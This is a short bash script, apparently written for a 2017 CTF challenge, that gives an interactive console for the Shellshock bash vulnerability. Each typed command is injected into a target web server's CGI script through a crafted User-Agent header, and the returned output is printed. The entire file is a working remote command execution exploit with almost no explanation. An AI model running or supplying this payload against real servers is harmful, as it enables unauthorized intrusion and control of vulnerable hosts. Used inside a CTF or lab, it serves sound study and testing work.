#!/bin/bash
#
# Shellshock Console 
# Created by rstoner (Ron Stoner)
# for Hackmethod 2017 CTF challenges

which curl &>/dev/null
if [[ $? -ne 0 ]]; then
	echo "[!] curl needs to be installed to run this script"
	exit 1
fi

# Execute commands 
while :; do 
	printf "[shellshock>] "
	read cmd
	curl -s -A "() { test;};echo \"Content-type: text/plain\"; echo; echo;${cmd}" -O http://{webserver}:8080/cgi-bin/{scriptname}
	cat {scriptname}
	echo ""
done
